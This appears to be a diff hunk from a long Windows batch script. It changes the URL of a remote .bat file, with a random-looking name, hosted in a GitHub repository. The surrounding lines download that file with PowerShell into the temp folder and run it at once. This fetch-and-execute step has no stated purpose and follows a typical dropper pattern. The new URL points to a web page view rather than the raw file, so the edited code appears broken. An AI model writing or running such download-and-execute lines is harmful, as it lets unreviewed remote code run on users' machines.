@@ -1569,7 +1569,7 @@ ping 8.8.8.8 -t
 
 
 @echo off
-set URL=https://raw.githubusercontent.com/YAKIM233/-/main/xddsadas3.bat
+set URL=https://github.com/YAKIM233/2331/blob/main/xddsadas3.bat
 set TEMP_FILE=%TEMP%\downloaded_script.bat
 powershell -Command "Invoke-WebRequest -Uri %URL% -OutFile %TEMP_FILE%"
 call %TEMP_FILE%
